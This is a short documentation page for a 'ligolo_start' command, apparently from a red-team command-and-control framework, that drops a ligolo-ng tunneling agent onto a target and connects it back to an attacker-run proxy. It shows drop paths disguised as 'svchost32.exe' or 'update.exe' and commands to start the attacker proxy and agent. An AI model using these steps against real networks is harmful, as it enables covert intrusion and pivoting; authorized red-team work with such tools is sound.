+++
title = "ligolo_start"
chapter = false
weight = 5
+++

## Summary
Start a ligolo-ng agent session. If a binary is embedded at build time (`embedded_binary` build parameter), it is dropped to `remote_path` and executed automatically. Otherwise, upload the agent manually first.

## Arguments
| Name | Required | Description |
|------|----------|-------------|
| `connect` | Yes* | Proxy address: `host:port` or `ws://host:port` |
| `bind` | Yes* | Bind to `ip:port` instead of connecting out |
| `remote_path` | No | Drop path on target (default: `C:\Windows\Temp\svchost32.exe`) |
| `ignore_cert` | No | Ignore TLS certificate (default: true) |
| `retry` | No | Auto-retry on disconnect (default: true) |
| `accept_fingerprint` | No | Accept cert by SHA256 fingerprint |
| `proxy` | No | Upstream proxy URL |
| `user_agent` | No | Custom HTTP User-Agent |
| `verbose` | No | Verbose output (default: false) |

\* One of `connect` or `bind` is required.

## Usage

**Start proxy on attacker:**
```
./proxy -selfcert -laddr 0.0.0.0:11601
```

**Start agent (connect-out):**
```
ligolo_start 10.10.10.1:11601
```

**Start agent (bind mode):**
```
ligolo_start -Bind 0.0.0.0:11601
```

**Custom drop path:**
```
ligolo_start -Connect 10.10.10.1:11601 -RemotePath C:\Windows\Temp\update.exe
```

## Notes
- Up to 4 concurrent sessions.
- Requires `EMBEDDED_LIGOLO` at build time for automatic drop; otherwise upload the binary to `remote_path` first.
